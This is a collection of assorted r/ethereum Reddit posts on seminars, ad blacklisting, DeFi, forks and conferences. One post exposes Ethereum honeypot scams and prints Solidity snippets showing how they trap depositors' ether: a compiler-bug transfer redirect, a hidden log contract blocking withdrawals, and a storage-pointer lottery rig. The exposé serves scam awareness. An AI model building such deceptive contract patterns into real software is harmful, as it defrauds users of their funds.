Most seminars will consist of me simply livestreaming the design and development of a cryptoeconomic primitive from the ground up, verbalizing my thought process, and doing my best to answer any questions in the chat. Some questions will be answered more fully in a blog post at the end of each week.

The first two seminars will be livestreamed development of an extremely basic dapp, and will serve as a tour around some of the tools used. The first seminar will focus on building the contract itself (Solidity), and the second will focus on the interface (JS and/or Python).

Subsequent seminars will focus on implementing specific cryptoeconomic primitives, continuing in the style of livestreamed development with Q&A. When deciding on the next project to tackle during the seminars, I'll be taking student interest heavily into account.

The exact schedule and subjects of the first set of seminars will be determined later this week and sent out to the mailing list. Sign up for that [here](https://visitor.r20.constantcontact.com/d.jsp?llr=cfjazc6ab&p=oi&m=1130743473314&sit=ke8rgopmb&f=30cfc2bd-aba1-4875-b771-77dd294e1eaa).

### Coursework

Coursework is optional, unless one wants to become accredited. All coursework will focus on cryptoeconomic primitives: non-proprietary, simple tools or apps that are immediately practical (whether stand-alone or as a building block for larger systems).

By the time seminars start on Monday, we will have provided a list of cryptoeconomic primitive tasks and projects. CPA will provide direct guidance to any student capable of pushing any of these tasks or projects forward in meaningful ways. We expect this list to grow quickly, as the field of crytpoeconomic primitives seems rich and largely unexplored, and initial progress will lead to more advanced study.

### Accreditation

One of the first contracts we will develop in the seminars is an accreditation contract. The logic will be very simple, as will the application process.

To become accredited, one must independently make significant progress on a pre-approved cryptoeconomic primitive. More details on the accreditation process and policy will be announced next week.

### Interested?

- If you'd like a chance to attend the seminars live, respond to my comment below asking for seminar timing preferences. We'll aim for a schedule that allows as many people as possible to attend some of the seminars.
- [sign up for the mailing list](https://visitor.r20.constantcontact.com/d.jsp?llr=cfjazc6ab&p=oi&m=1130743473314&sit=ke8rgopmb&f=30cfc2bd-aba1-4875-b771-77dd294e1eaa), and expect to see a schedule with seminar titles and details mailed out later this week!

Did they require an ICO funding a ""first of its class, muti-functional web wallet"" accompanied by a flashy white paper? No. Do they even charge for their services? No. Do they provide support for questions about ENS even though they aren't officially part of the project. Yes. Has Taylor walked countless panicked people through the process of accessing their lost ETH? Yes, I suspect she has.

We've been using Google Ads for the past 6 months to help us get more visibility for our smart contract auditing services and we've noticed a strange change in the last few days. It seems that Google completely blacklisted Ethereum as a keyword.

Any of the keywords that contain ""ethereum"" in our campaigns are no longer showing ads as of January 9th and are now reporting the following error:

>An ad isn't showing now  
>  
>This candidate is not permitted to show ads in your targeted location.

Here's [a screenshot](https://imgur.com/a/FWyPZEx) of the mentioned error. We also tried [communicating with Google](https://twitter.com/DecenterTeam/status/1083392362544594944), but to no avail. Although the Google Ads team claims there have been no changes to their policies, you can try searches such as ""ethereum smart contract audits"" and ""eos smart contract audits"" - only the latter will show Ads in results.

We could not find any news about recent policy updates anywhere. The keyphrases such as ""ethereum security audits"" were simply getting impressions until January 8th and then suddenly stopped, showing only this very ambiguous error as the explanation.

What's interesting is that the blacklist doesn't apply to the keywords such as ""ico"", ""bitcoin"", ""eos"" etc. We also tried VPNing to multiple different countries and it seems that no ads with ""Ethereum"" in the search term are showing up anywhere.

Is anyone else seeing the same thing and do they have an idea as to why?

We are concerned that Google is targeting Ethereum specifically for some reason and wanted to see if we as a community could put some pressure on the Google Ads team to adjust their keyword policy or to at least provide a reasonable explanation for such discriminatory regulations."

I would like to share it with you. It's amazing what Ethereum has pulled off as a community. It's truly special and the collection of people (cryptographers, artists, dreamers and creators). As an ode to what the community has built, I wanted to make sure we named the first satellite that XYO launches after Ethereum! I'm heading to ETHDenver with my team this year and look forward to catching up with everyone I met from last year!

From the press release, here's the part I'm most proud of!

>*For Phase Two, XYO Network will launch its own custom satellite with Spaceflight aboard a SpaceX Falcon 9 in late 2019, on SpaceX CRS-19. XYO will send its first satellite, named the ‚ÄúEtherX,‚Äù into orbit, in a nod to the ‚ÄúEthereum‚Äù blockchain platform.*  
>  
>*XYO Network Co-Founder Scott Scheper commented: ‚ÄúSpeaking personally, Ethereum inspired me to go from a long-time blockchain observer to going ‚Äòall in‚Äô. My work is now 100 percent focused on blockchain technologies. What the Ethereum developer community and Vitalik Buterin have built, has moved the entire ecosystem forward, period. As an ode to Ethereum and Vitalik, we decided to name our first satellite the ‚ÄòEtherX.‚Äô‚Äù*

0,ethereum,"Exposing Ethereum Honeypots I've noticed a plethora of scam/honeypot contracts being published on etherscan. I've also been wanting to contribute to the ethereum community more and so I thought this would be a perfect opportunity to do a little write up that would go over the details of some of these contracts. There will be a bit of code in this post, though nothing too complex. Hopefully this will serve as an educational piece, but bear with me as I don't often write posts.
### Dividend Distributor
https://etherscan.io/address/0x858c9eaf3ace37d2bedb4a1eb6b8805ffe801bba#code

This smart contract takes advantage of a Solidity compiler bug detailed here:  https://etherscan.io/solcbuginfo?a=SkipEmptyStringLiteral. 
This bug results in skipping the empty string literal `""""` when passed in as a function argument. Here's the code for the function of interest: 

    
    function divest(uint amount) public {
        if ( investors[msg.sender].investment == 0 || amount == 0)
            throw;
        // no need to test, this will throw if amount > investment
        investors[msg.sender].investment -= amount;
        sumInvested -= amount; 
        this.loggedTransfer(amount, """", msg.sender, owner);
    }
    

Any investor trying to divest will be in for a rude awakening when their ether is transferred to the owner's address. The bug results in this line of code `this.loggedTransfer(amount, """", msg.sender, owner)` being translated to `this.loggedTransfer(amount, msg.sender, owner)` and so the owner is the true recipient. 

### Private Bank
https://etherscan.io/address/0xb5e1b1ee15c6fa0e48fce100125569d430f1bd12#code

This contract makes use of the same bug found in the infamous DAO hack. Here's the code of interest:

    if(msg.sender.call.value(_am)()) {
        balances[msg.sender] -= _am;
        TransferLog.AddMessage(msg.sender, _am, ""CashOut"");
    }

For anyone not familiar with the interworkings of the DAO hack, the line `msg.sender.call.value` sends the remaining gas with the `call` function, whereas `msg.sender.send(value)` only sends a fixed stipend of 2300 gas. Normally, `msg.sender` would be a typical wallet address, but in the case where it is a smart contract address the fallback function is invoked. The key here is that the ether being sent is not subtracted from the balance until *after* it is sent. If it was subtracted before, this recursive attack would not work. So all the fallback function has to do is call the `withdraw` function and add in logic to make sure it doesn't take more ether than the contract holds.

So what's wrong here? The answer lies in the `TransferLog.AddMessage` call. You may have noticed that the Log contract source was posted to etherscan, only that wasn't the real source code. Notice how the contstructor of PrivateBank sets the address of the real Log contract. All the creator of this contract had to do was make sure that the real Log contract had a function with the same signature as the `AddMessage` function posted. The real source code probably looks something like: 

    function AddMessage(address _sender, uint256 _amount, string _message) {
        // note that this is not valid solidity
        require(_sender == owner || _message == ""Deposit"");
        // and so on ... 
    }

This translates to: if the sender isn't me or someone isn't depositing ether then fail, which will revert all state changes, thus never allowing you to withdraw your ether.

### Open Address Lottery 

https://etherscan.io/address/0xd1915A2bCC4B77794d64c4e483E43444193373Fa#code

This contract scams participants by masquerading as a legitimate lottery, but of course it's not. The malicious code is disguised by a subtle solidity quirk. Take a look at this function: 
    
    function forceReseed() { //reseed initiated by the owner - for testing purposes
        require(msg.sender==owner);
        
        SeedComponents s;
        s.component1 = uint(msg.sender);
        s.component2 = uint256(block.blockhash(block.number - 1));
        s.component3 = block.difficulty*(uint)(block.coinbase);
        s.component4 = tx.gasprice * 7;
    
        reseed(s); //reseed
    }

You'll notice that an instance of the struct SeedComponent is created. Most programmers, familiar with other popular programming languages, would assume that s is a local instance of the SeedComponent struct ie. it goes on the runtime stack. However, in Solidity any *complex* data type is implicitly a storage pointer unless otherwise specified. This results in component1 pointing to index 0, component2 pointing to index 1, and so forth. The `LuckyNumber` variable lives at index 3 and is assigned the value of `tx.gasprice * 7`. This makes it impossible to win, as the winner is selected via a function that looks like `NotSoRandomNumber % 2`.

Here the owner calls the `forceReseed` function:
https://etherscan.io/tx/0xf554329a9b949b408d9c75614261ae48d38c818a3f4df970cfeef7f48c2238c4

And here's documentation outlining this quirk (it's pretty easy to gloss over it):
http://solidity.readthedocs.io/en/develop/types.html

### New Years Gift

https://etherscan.io/address/0x13c547Ff0888A0A876E6F1304eaeFE9E6E06FC4B#code

This contract takes advantage of a small flaw in a third party resource that many of us use, etherscan. The flaw being that etherscan doesn't show contract A calling functions from contract B as a transaction under contracts B's history, making it easy to obfuscate function calls. Basically, this contract works by allowing the user to set the `hashPass` only if `passHasBeenSet` is false. Anyone who knows the input that produced the value of `hashPass` can claim the funds of this contract by calling `GetGift`. Of course, the storage variable `passHasBeenSet` is private and therefore not readable via etherscan. Luckily, we can use web3 and check the value of the variable ourselves: 


    > web3.eth.getStorageAt(""0x13c547Ff0888A0A876E6F1304eaeFE9E6E06FC4B"", 1)
    < ""0x00000000000000000000008ca354f7e84881157bdbc36d8c40d5b5077621b601""


Note that `sender` and `passHasBeenSet` belong to the same storage slot since addresses take up 20 bytes and booleans take up 1 byte (storage slots are 32 bytes). Therefore the last two characters belong to `passHasBeenSet`, which has a value of 01 -> true.

On a side note, I've contacted etherscan about this issue and I imagine they will fix this at some point - which reminds me; a friend of mine recently contacted etherscan about another *flaw* where the contract source code wasn't being wrapped. Someone posted a very similar honeypot to this one where there was code being prefixed by a ridiculous number of spaces resulting in the code being rendered off screen (unless you happened to see the tiny horizontal scrollbar and scrolled over). Etherscan has since fixed this issue, in a timely matter too.

After very extensive and detailed research in conjunction with BlockProof Tech LLC, DAO.Casino is announcing that it has found the future of the gambling industry. In what it is terming Gambling 3.0, DAO.Casino has found a way to increase interaction speed between DApps‚Äô players, without losing any gas costs or security. The study has successfully shown that the generating of a new block approximately every 15 seconds and every transaction taking an average of six minutes can be reduced. This is because Game Channels will run on top of existing blockchains.

**Abstract**¬†

Blockchain technology has immense potential. At the same time, it is not always possible to scale blockchains. State Channels solve the problem of scalability while increasing the blockchain's speed and efficiency. State Channels present a workaround to current blockchains' TPS (transaction per second) bottleneck. We used State Channels as a foundation and created Game Channels. We built it around the needs of the gambling market. We also developed Signidice PRNG as well as a dispute resolution mechanism. Signidice uses unique digital signatures and is also described below. The potential use of Game Channels technology is not only gambling; some types of online gaming may also be able to use it.

The truth is that behind the scene some incredible things are happening and paving the way for Ethereum to become the operating system of the world but some of you can't see that so I'll try to explain my vision:

# Ethereum is starting to replace Banks by allowing users to receive loans from the Blockchain

I recently used for the first time MakerDAO‚Äôs CDP system that lets you ¬´¬†loan yourself¬†¬ª a certain amount of DAI (= 1 USD) according to the amount of ETH you are willing to use as a collateral.

For the first time in modern finance we are able to loan ourselves money based on our assets at an interesting rate (2.5%) without having to use a central entity like a bank.  Basically you receive your ETH back when you return the DAI loaned and if the value of ETH climbs you might never have to reimburse the DAI loaned.

This has huge implications and it also means that Ethereum users can receive money from holding their ETH without having to sell it. They can also leverage their ETH position by acquiring more ETH with the DAI received from the loan and lock it again in the CDP to decrease the risk of reaching the liquidation price.

# Incentives to hold DAIs (an Ethereum based USD) will create a wave of new money joining the Ethereum Network

This is a game changer. Maker recently announced the [Dai Saving Rate system](https://medium.com/makerdao/dai-reward-rate-earn-a-reward-from-holding-dai-10a07f52f3cf) allowing DAI owners to lock their DAI in a DSR contract and receive a 2% annual interest in return without having to pay any fees.

In my country, the interest on the money I have in my bank account is around 0.7% which means that people will soon have greater incentives to turn their savings into DAI and lock it in a DSR rather than keeping it in their bank account. This has huge implications for the Ethereum Blockchain has it could trigger a massive amount of new money joining the Ethereum Blockchain to benefit from this annual interest.

I‚Äôve always seen crypto debit cards like Monaco (now crypto.com), Wirex or TENx as a bad thing for the market since it simply meant selling your crypto at market rate to use FIAT to pay for things. But I now see them as a great bridge between the crypto and FIAT system as it could give us the opportunity to simply spend our DAIs received by a CDP loan or by the interest from the Dai Saving Rate system.

# Plasma is coming

OmiseGo has been very quietly moving forward with Plasma development (they released their first test net during Devcon) and its global DEX integrating FIAT gateway will arrive at some point and make the transition between FIAT and crypto much more straightforward.

# Some other projects that I like

Millions of people are using the Brave browser and will be at some point exposed to BAT (an Ethereum token). 3d artists are using the Ethereum Blockchain through Golem to render 3d designs. dYdX lets you do margin trading in a fully decentralized way by purchasing some Long or Short Tokens, I just acquired some Leveraged Tokens on [expo](https://expotrading.com/trade) (based on dYdX) and I'm amazed...

While a lot of you are complaining about crypto prices going down, I see thousands of developers quietly developing the different pieces of a puzzle that will soon be complete.

If you believe in decentralization, don‚Äôt give up, be patient and spread the word about great crypto projects instead of just talking about the price with your friends. We are participating in a unique adventure and I‚Äôm proud of that.

*Disclaimer: I own some the tokens that I mentioned but I don‚Äôt want this to appear as a shill post.*"

### What is Ethereum?

Ethereum is a cutting edge blockchain-based distributed computing platform, featuring smart contract functionality. It provides a decentralized virtual machine, the Ethereum Virtual Machine (EVM), that can execute peer-to-peer contracts using a crypto-fuel called _Ether_.

0,ethereum,"Facebook's Libra Will Do For Blockchain What America Online Did for the Internet Blockchain has been compared to the internet in 1995 for as long as I care to remember. Well, Facebook's Libra coin represents a move toward the late 90's. The internet in 1995 was immature, the web/html was just beginning to spread, adding attractive graphics and GUI UX's to what had previous been a cluster of disjointed, mainly text based interfaces. It was still the realm of nerds and early adopter's, Mom and Dad and Grandma and Grandpa didn't care about it much even if they had heard of it. Then, something happened, AOL began putting disks in every American's mailbox. The way they were used to interacting with the rest of the world. It was easy to use and a familiar experience for anyone who could already use a Window's PC as their super fancy typewriter. People began using email, and consuming the gobs of information newly available to them. Slowly they began to discover that there was even more out there beyond the walled garden AOL presented to them, there was the internet! It was wide open, no barriers, no artificial limits, it was amazing! That is what Facebook's Libra will be for crytpo currencies, a catalyst to adoption that will introduce Facebook users in a very gentle way to crypto currencies and their potential. Then users will discover they don't need Facebook's leashes, they can operate freely without the glare of big brother's omni-present eye and eventually Facebook's network will fall into disuse the way AOL has while truly open blockchains flourish."

0,ethereum,"Personal statement regarding the fork I personally believe that the soft fork that has been proposed to lock up the ether inside the DAO to block the attack is, on balance, a good idea, and I personally, on balance, support it, and I support the fork being developed and encourage miners to upgrade to a client version that supports the fork. That said, I recognize that there are very heavy arguments on both sides, and that either direction would have seen very heavy opposition; I personally had many messages in the hour after the fork advising me on courses of action and, at the time, a substantial majority lay in favor of taking positive action. The fortunate fact that an actual rollback of transactions that would have substantially inconvenienced users and exchanges was not necessary further weighed in that direction. Many others, including inside the foundation, find the balance of arguments laying in the other direction; I will not attempt to prevent or discourage them from speaking their minds including in public forums, or even from lobbying miners to resist the soft fork. I steadfastly refuse to villify anyone who is taking the opposite side from me on this particular issue.

Miners also have a choice in this regard in the pro-fork direction: ethcore's Parity client has [implemented a pull request for the soft fork](https://github.com/ethcore/parity/pull/1309) already, and miners are free to download and run it. We need more client diversity in any case; **that** is how we secure the network's ongoing decentralization, not by means of a centralized individual or company or foundation unilaterally deciding to adhere or not adhere to particular political principles."

0,ethereum,"By The End Of This Year 50,000 People Will Have Ethereum Wallets & Never Know Thanks To The GET Protocol Hey Guys,

Wanted to inform you all of a project that not many people know of called the GET Protocol (www.guts.tickets) and what it is actually achieving for us tech heads as their tech is being used for a bunch of events throughout the Netherlands and by the end of the year over 50,000 people will have ethereum wallets and far far more by the end of 2019. It's been in development for over two years by GUTS, a team in the Netherlands working to make ticket scalping impossible using smart tickets.

In fact here's a picture of a theatre audience, each and every one of them (about 1k people) received an ethereum wallet in the background that day and they had no idea which in my mind is the real path to consumer adoption, we let the blockchain be the engine that drives the end product as the end user should never need to know that blockchain exists! By the end of next year they reckon they will have sold 1 Million tickets all registered and state changed through the ethereum blockchain using the GET cryptocurrency also.

https://imgur.com/a/ppXUvSr

If you want to, you can check out some of the event ticket states that are being recorded onto the ethereum blockchain:

There are a bunch more but thought that would be enough to show you guys, it's cool also because people later this year will also be getting some cryptocurrency behind the scenes too with GET which essentially powers the GET protocol. Anyways, If you are interested in learning more about why I believe consumer adoption requires us to shift our view point on how the blockchain needs to integrate into projects and why the GET Protocol does a good job of this then my article is here:

0,ethereum,"Can We Talk About How Mist Wallet Is Totally Unusable After Almost 3 Years Of Development? I'm a big believer in the future of Ethereum and a very long-term holder. However I have to say I'm very disappointed in Mist wallet. When I first downloaded it in January of 2016 I was not surprised that there were many bugs/glitches and that it would freeze constantly, as this was early-stage software.

However here we are three years later and I still can't get my Mist wallet to run. I use MEW, but I want to check on the ENS domains I own, and can only do so by accessing Mist. When I run Mist it just overheats my computer and freezes after 15 minutes or so every time. This is with no other applications running.

I actually would have bid on more ENS domains if this hadn't been such an issue. Does anyone else deal with this same issue? Are there any solutions being proposed to improve the utterly terrible UX of Mist? The fact that an unfunded third party (MEW) can put together such a vastly superior product than the Ethereum Foundation with hundreds of millions in funding is, to be honest, concerning to me."
0,ethereum,"OMG Network's Great Reddit Scaling Bake-Off Proposal &#x200B;

[OMG Network and the Great Reddit Scaling Bake-Off](https://preview.redd.it/pld4qb1yp7e51.png?width=2240&format=png&auto=webp&s=ff44cb6ec1d978562d4353a67b97118404adc4af)

Late last month, Reddit announced The Great Reddit Scaling Bake-Off, an open-invitation competition calling all Ethereum scaling projects to show the community a scaling solution that can be used to bring Community Points to mainnet.

Once we decided to take up the challenge we had one goal in mind: to build a live and scalable application that our 43K strong Reddit community\* can use to transfer ROCKs (community points) on our subreddit in real-time ‚Äî all while fulfilling the technical requirements laid out by the Reddit team.

It took us less than 30 days to achieve our goal.

# Introducing the Community Points Engine by OMG Network

The [Community Points Engine (CPE) powered by OMG Network](https://omg.network/reddit-bakeoff-scaling-community-points/) is a Chrome Extension that allows for fee-less and near-real-time value transfer while browsing the OMG Network subreddit. Users can transfer points without entering the receiver‚Äôs wallet address; the extension automatically extracts it for you, making transfers fluid and easy.

&#x200B;

[Introducing the OMG Community Points Engine](https://reddit.com/link/i19us9/video/1a0w2vqkm7e51/player)

But the CPE is not only built with the subreddit subscriber in mind, the tool serves all types of Reddit users. So if you‚Äôre a moderator, you can immediately mint and distribute points to anybody on the subreddit, as well as burn points and handle all admin actions with a user-friendly dashboard. If you‚Äôre a Reddit team member, you can rest assured knowing that the OMG Network can withstand the traffic threshold that Reddit requires thanks to our MoreViable Plasma Technology.

It‚Äôs no secret that designing for simplicity is hard, but simple is desirable, and that‚Äôs why it was our priority with this application. Because while we understand and appreciate the value of trustlessness in technology, the concept, and the feature is inherently complicated. We want the CPE to be something everyone can use, and will only highlight ‚Äòtechnical‚Äô elements when necessary.

* **Usable:** The Community Point interface allows users to make fee-less transactions just like they would through a regular app. The integration is seamlessly built into the current subreddit browsing experience.
* **Scalable:** OMG Network‚Äôs MoreViable Plasma design is capable of handling thousands of transactions per second. The new fee-relayer design also allows point providers to manage funds and settle multiple fee-less transactions at the same time.
* **Interoperable:** Never build products in a vacuum. The solution is fully compatible with existing wallets such as Metamask. In fact, interoperability is so important to us that we‚Äôve integrated a third-party provider ‚Äî [CurveGrid‚Äôs MultiBaaS](https://docs.omg.network/3rd-party/multibaas) ‚Äî as part of the solution itself.
* **Secure:** We take software security seriously. The underlying network is trustless and non-custodial. This means users have full ownership over their points even if the network faces issues. Our solution also takes advantage of secure key management standards like Hardware Security Module.
* **Decentralized:** No need to trust the operator, our Watcher software and Plasma protocol ensure nobody has to put their trust on one central point of failure

# A Few Words on What We Care About

The blockchain ecosystem is well on its way to mainstream adoption and large-scale applications like Reddit are beginning to look at trustless technology to solve real problems. The time for experimentation and theoretical design is over; it‚Äôs time for production-ready software to take center stage.

We standby what we‚Äôve accomplished in the past 30 days and consider this challenge as a great way to showcase the OMG Network and our seriousness as a team. We approached the Great Reddit Bake-Off as we would any client project, leaving no stone unturned when it came to delivering a well- designed, well-documented, and well-developed solution.

The Bake-Off‚Äôs specs are descriptive, but we know that great software is much more than that. It is a collaboration between client and solution provider. We look forward to upcoming iterations and hope to discover and work towards Reddit‚Äôs real needs so that we can design the right type of infrastructure for their application.

Nonetheless, a competition like this goes to show how mature the Layer-2 space has become over the past few years. As we advance as a company, we‚Äôll be sure to design, develop, and iterate on our product and look to see other projects grow from theoretical design to a complete product.

Finally, software is not done because we've met the deadline. There is always room for improvement. Over the next few days we will be inviting you all in to help us test the CPE Chrome Extension on our new subreddit: [r/omgnetwork](https://www.reddit.com/r/omgnetwork).

0,ethereum,"Ethereum is for the internet what Bitcoin was for the banking system I always use this phrase to explain people the difference between Bitcoin and Ethereum. Then, I explain that Bitcoin was created as a digital currency and Ethereum as a medium to create decentralized applications. 
How do you guys explain other people with little to no background on cryptos ? "
0,ethereum,"Why Ethereum matters, why we should root for Ethereum over almost all competing smart contract platforms Bitcoin had a fair launch. Anyone who knew about Bitcoin and had access to a PC could mine from day 1. Over time, mining became more difficult but people could easily buy BTC on various exchanges or from other people who had Bitcoin. You didn't have to be a member of a privileged class to get into Bitcoin at the ground floor.

Ethereum had a fair launch. Unlike Bitcoin, the project was far too ambitious for the people who conceived of it to pay for its development out of pocket. So they held an open crowd funding to pay for development. Anyone who heard about Ethereum could participate in the crowdsale, priced at about 30 cents/ETH. After the chain launched, anyone with a modern graphics card could also mine Ether and put some away.

Some founders on the team didn't care for that funding model for Ethereum. They wanted Ethereum to be funded by insiders and VCs and held private for a long time. Some even left the project, or were encouraged to leave, over the difference in vision between an open community non-profit project, and a VC-held and VC-controlled for-profit organization.

And of course both Bitcoin and Ethereum are open-source projects with licenses that encourage the ability to copy, rework, and reuse the project code.

These days there are lots of Ethereum ""killers"", ETH 2.0 ""killers"" and ETH competitors launching and planned for launch. For the most part, they do not adhere to the Bitcoin or the Ethereum open participation models. Some are closed-source, copyrighted projects. Almost all were and are funded by VCs and the wealthy via SAFTs, often through secret deals where price and amount of tokens are not disclosed. The public is generally not allowed to participate until the tokens get marked up 5x, 10x or 100x before an exchange listing. So you will end up with the vast majority of tokens owned by a very few, already very wealthy people. 

But a radically unjust token distribution isn't all that these new ""Ethereum Killers"" have. No, they also are, almost to the last, designed around plutocratic governance. That is, if you are one of VCs, the insiders and wealthy allowed to buy in early before the marking up to retail, you will have orders of magnitude more tokens and therefore you will have orders of magnitude more control over future changes to blockchain rules than the hoi polloi. Some even see this kind of governance as a feature and a good thing. I disagree emphatically!

Ethereum was an open, community-supported launch organized by a non-profit entity. It is today an open and community-participatory project. There are no fees to attach your application to Ethereum, other than gas costs. The blockchain is permissionless, no plutocracy can ""vote you off the island"". Ethereum is not run by rich VCs and ""accredited investors"" who got in on the ground floor when you couldn't.

I do hope that Ethereum wins out. I think there is an enormous difference between an open community project and almost all of the competitors who launched after. I do not want the future of humanity's financial internet to be based on plutocratic control by the fabulously wealthy. How would that be one bit better than the existing financial system?

If making these observations, if hoping that Ethereum becomes the global financial commons, instead of a pluto-chain taking over, makes me a narrow-minded Ethereum maximalist, so be it."

0,ethereum,"Stealth Ethereum-Based Company pays ~$1 billion for land in Nevada next to Tesla, Google, Apple. Not sure how this news isn't piquing more interest: https://www.rgj.com/story/money/business/2018/01/23/industrial-park-houses-tesla-gigafactory-nearly-sold-out-after-blockchains-deal/1059002001/

Some interesting/weird facts:

* ~**65,000 acres** purchased by **Blockchains LLC**, paid in cash. That is 20x the land holdings of their new neighbors (Tesla's Gigafactory @ 3,000 acres, Google @ 1,200 acres).

* Tahoe Reno Industrial Center's [website](http://tahoereno.com/sites/) lists land price at $2.25/sf which would be ~$100,000/acre. This would be imply $6.5 billion paid, however if you compare to previous discounts (i.e. [Google's discount](https://www.rgj.com/story/money/business/2017/04/17/google-buys-land-near-tesla-gigafactory-east-reno-data-center-technobubble/100566250/)) of ~1/4 of that, it's safe to say **$1 billion** is a ballpark number for the final price paid.

* [Blockchains LLC's](https://www.blockchains.com/)'s apparently new website is rather barren, with no clear indication of what they actually do, except for running [ETHnews.com](https://www.ethnews.com/) and creating distributed apps on the **Ethereum** blockchain. Their [linkedin company page](https://www.linkedin.com/search/results/people/?facetCurrentCompany=%5B%2211430130%22%5D) only shows 10 employees, led by a Jeffrey Berns (CEO) and David Berns (COO). Not to mention that ""Blockchains LLC"" sounds a lot like an impersonation company name.

* David Berns is also the CFO of [Berns INC](http://www.bernsinc.com/), which ""creates software using blockchain-based technology."" Its a small company with only 9 people, 5 of which are developers. Most of the people working for Berns INC overlap with Blockchains LLC, and I wouldn't be surprised if Blockchains LLC is just a subsidiary of Berns INC

* Jeffrey Berns and David Berns are also partners at [BernsWeiss LLP](https://www.law111.com/) law firm, which is a ""virtual currency class action practice""

Maybe I'm not aware of these companies footprint on the Ethereum ecosystem, but to me its weird that a relatively unknown company has $1 billion cash to drop on *land only*, with no clear indication about what they're going to use it for besides 150 acres for a ""campus park that will house the company's headquarters"". For 10 people?!


Anyone have any more information on this?"

0,ethereum,"Confidential Transactions on Ropsten So I found a bit of time over Christmas break to experiment with Confidential Transactions.  I finally have a working prototype for a CT Token on Ropsten ([link](https://ropsten.etherscan.io/address/0xeace8fbe35577a892a01a05220deac93af9af0ce#code)).  I probably won't be devoting much more time to it, but I thought it was cathartic to get something out there.

If anyone wants to experiment with it, I have some test vectors that I published on pastebin ([link](https://pastebin.com/DTXqJGyy)).

I also wrote a small, albeit incredibly dirty and undocumented, python script to help generate CT range proofs ([link](https://pastebin.com/MS0ErYGW)).  One may or may not find that useful.

Overall the gas is not the greatest, but it is workable.  I sent a CT which proved two Pedersen Commitments of 3-bits (base4) a power of 17 and an offset of 0 wei.  These each covered a number in the range from 0.0 to 6.4 ETH in 0.1ETH increments.  I also then withdrew one of the new CT outputs for 0.2ETH (thus revealing what it was).  This took about 2,000,000 gas, plus another 100,000 for the final withdraw.

I apologize in advance for the rough spots in the contract and the documentation.  Hopefully some project finds this useful.  Looking forward to when this tech goes mainstream!"
0,ethereum,"Thank you, Ethereum Foundation and friends! So wasn't DEVCON3 awesome?

Great job, everyone at the Ethereum Foundation and volunteers and presenters and everyone else who had a hand in this amazing event.  And at such scale too :-)

I had a fantastic time and I am sure that the same is true of the other attendees.   So many great conversations.  So many potential future collaborations initiated and friendships made.  I got to meet many people who I had still never ever met in IRL, despite having known them 2+ years online.

As a technology and as a community we are a world further forward than we were a year ago.   It is fantastic to see so much progress and such a wealth of great projects ongoing.

By #devcon4 I am sure that Ethereum will be leaps-and-bounds forward again.  Adoption is rampant.

Bravo again to everyone who facilitated this fantastic IRL fiesta ü¶Ñ"

0,ethereum,"Were people this skeptical in the early days of the Internet? For all its evangelists, blockchain technology certainly gets a lot of hate. And not just amongst the computer illiterate. Tech savvy places like HackerNews have a very anti-blockchain sentiment. 

While I am a believer in the utility of blockchain technologies, even I have my skepticism.

It makes me wonder... Were people this skeptical of the Internet's potential back in its early days? The Internet turned out to be a ~pretty big deal~. Were people worried that it wouldn't?"
0,ethereum,"[Announcement] Ethereum Conference in Paris - 8th,9th & 10th March 2018 We (Asseth) were delighted by the wonderful feedback we had after EDCON Paris in Feb 2017. After speaking to representatives of the Ethereum community in Amsterdam, Berlin, London and Rome it appeared that the desire for a major recurring Ethereum event in Europe was very strong. So here here it is:

#EthCC - Ethereum Community Conference

##Where and when?
###‚Æï [EthCC](http://ethcc.io/) will take place in Paris at the Conservatoire Nationale des Arts et M√©tiers (CNAM) on 8th, 9th and 10th March 2018.
The venue is an engeneering school  a [museum](http://www.arts-et-metiers.net/les-collections) dedicated to innovation and technology.
EthCC talks will be spread accross 4 amphitheaters allowing for multiple streams (Scalability, Anonymity, Development tools, Governance, Compliance...) and longer duration than usual.

##Who is organizing EthCC?
### ‚Æï [Asseth](https://www.asseth.fr) is the organizer with the support of the Ethereum Foundation and the CNAM.
Asseth is a regulated French non-profit organization. It hosts free Ethereum workshops several times a month since early 2016, feeds the [ethereum-france website](https://www.ethereum-france.com) and translates technical papers in French (see [here](https://www.ethereum-france.com/livre-blanc-white-paper-ethereum-traduction-francaise/), [here](https://www.ethereum-france.com/yellow-paper-ethereum-livre-jaune-traduction-complete/), [here](https://www.ethereum-france.com/%EF%BB%BFethereum-2-0-mauve-paper-traduction-francaise/) and [there](https://www.ethereum-france.com/quest-ce-que-la-fragmentation-ou-sharding-faq-par-v-buterin-traduction/) ). Asseth also participates to various educational projects and [open-source projects](https://github.com/asseth/).
Although the tickets will be sold at cost, any eventual benefits will be allocated in future workshops and community projects.

##Why should you attend EthCC?
###  ‚Æï It's a unique occasion to learn what is happening on Ethereum directly from the actors working on the latest development!
The Multiple streams will fit different areas of interest and we are also planning hands-on workshops. The location is in the center of Paris and we will soon publish a new [Crypto Guide To Paris](https://meta.ethereum.stackexchange.com/questions/407/edcon-a-cryptofriendly-guide-to-paris) ! Asseth will set up events the days before the event for people coming in advance.

##Confirmed speakers/attendees:
Nick Johnson, Martin Becze, Aron Fischer, Frankie Pangilinan, Makoto Inoue, Raine Revere, Thomas Bertani, Andres Junge, Jordi Baylina, Griff Green, Cl√©ment Lesaege, Thibaut Schaeffer, Raphael Mazet, Rick Dudley, Josh Stark, Nicolas Bacca, Ashley Tyson, Robbie Bent, Vincent Eli, Simon Polrot, Jerome de Tychey, Jenna Zenk, Jutta Steiner, Will King, Jack Spallone, Daniel Nagy, Hudson Jameson, Dimitry Khoklov, Rob Stupay, Yann Levreau, James Pitts, Andrei Maiboroda, Vanessa Grellet... and many more to be announced

We are looking forward to seeing you all in March <3

0,ethereum,"A Grab Bag of Thoughts on ETC and Forks 1) Three months ago I made [a statement](https://backchannel.com/the-uncanny-mind-that-built-ethereum-9b448dc9d14f#.5e1mm1fcj) in an interview with Morgen Peck as follows:

> I generally support just about every secession attempt that comes along,‚Äù he says. ‚ÄúIf in the future there is that kind of a dispute in Ethereum, I‚Äôd definitely be quite happy to see Ethereum A go in one direction and Ethereum B go the other.

I **do** have principles, and this is a principle that I have so far held consistently. It would of course be grossly hypocritical for me to (correctly) [decry bitcoin maximalism](https://blog.ethereum.org/2014/11/20/bitcoin-maximalism-currency-platform-network-effects/) back in 2014, and then start shouting ""one chain to rule them all! network effects!"" the moment it becomes suitable to me. Rather, I believe, just as I had stated [in my 2014 post on silos](https://blog.ethereum.org/2014/12/31/silos/), that:

